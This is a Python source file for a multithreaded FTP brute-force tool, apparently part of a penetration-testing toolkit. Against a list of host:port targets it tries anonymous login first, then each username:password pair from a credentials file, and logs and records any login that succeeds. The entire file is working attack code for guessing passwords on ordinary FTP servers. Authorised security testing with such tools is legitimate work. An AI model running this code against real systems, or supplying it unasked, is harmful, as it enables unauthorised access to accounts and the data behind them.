import ftplib
import time
from threading import *
import logging


# Console colors
W = '\033[0m'  # white (normal)
R = '\033[31m' # red
G = '\033[32m' # green


# global variables for threads coordination
Found = False
Fails = 0


class ContinueBrute(Exception):
    pass


class FTP_BruteForcer(object):

    def __init__(self, target_list, credfile, thread):
        self.connection_lock = BoundedSemaphore(value=thread)
        self.findings = []
        self.target_list = target_list
        try:
            self.credfile = open(credfile,'r')
        except FileExistsError:
            logging.warning(R+'Credentials file does not exist, exiting...'+W)


    def connect(self, host, user, password, port, release):
        """
        handle ftp connection and check the credentials
        :param host:
        :param user:
        :param password:
        :param port:
        :param release:
        :return:
        """
        global Found, Fails
        try:
            time.sleep(1)
            ftp = ftplib.FTP()
            ftp.connect(host=host, port=int(port))
            ftp.login(user, password)
            logging.info(G+'FTP Password Found for host: %s:%s \nUsername: %s \nPassword: %s' % (host, port, user, password) +W)
            finding = host + ';' + port + ';' + 'FTP' + ';' + 'Default Credentials' + ';' + 'FTPBrute' + ';' + 'Credentials: ' + user + ':' + password
            self.findings.append(finding)
            Found = True
            ftp.quit()
        except Exception as e:
            if 'Authentication failed' in str(e):
                pass
            else:
                logging.debug('Connect Error: '+str(e))
                Fails += 1

        finally:
            if release:
                self.connection_lock.release()


    def anonLogin(self, host, port):
        """
        Verify anon FTP login
        :param host: string
        :param port: string
        :return:
        """
        user = 'anonymous'
        password = ''
        try:
            ftp = ftplib.FTP()
            ftp.connect(host=host, port=int(port))
            ftp.login(user, password)
            time.sleep(2)
            logging.info(G+'FTP anonymous login allowed for host: %s:%s \nUsername: %s \nPassword: %s' % (host, port, user, password)+W)
            finding = host + ';' + port + ';' + 'FTP' + ';' + 'Default Credentials' + ';' + 'FTPBrute' + ';' + 'Credentials: ' + user + ':' + password
            self.findings.append(finding)
            ftp.quit()
        except Exception as e:
            if 'Authentication failed' in str(e):
                pass


    def run(self):
        """
        launch the threads tha perform brute force
        :return:
        """
        global Found, Fails

        for host in self.target_list:
            Fails = 0
            target = host.split(':')[0]
            port = host.split(':')[1]
            logging.info('Testing: %s:%s' % (target, port))
            self.anonLogin(target, port)
            self.credfile.seek(0)
            try:
                self.credfile.seek(0)
                for line in self.credfile.readlines():
                    user = line.split(':')[0]
                    password = line.split(':')[1].strip('\r').strip('\n')
                    if Found:
                        raise ContinueBrute

                    if Fails > 5:
                        logging.warning(R + 'Too many errors for host: %s:%s' % (target, port)+W)
                        raise ContinueBrute

                    self.connection_lock.acquire()
                    logging.debug('Testing host: %s:%s \nUsername: %s \nPassword: %s' % (target, port, user, password))
                    t = Thread(target=self.connect, args=(target, user, password, port, True))
                    t.start()

            except ContinueBrute:
                Found = False
                continue
        try:
            t.join()
        except Exception:
            pass

        return self.findings
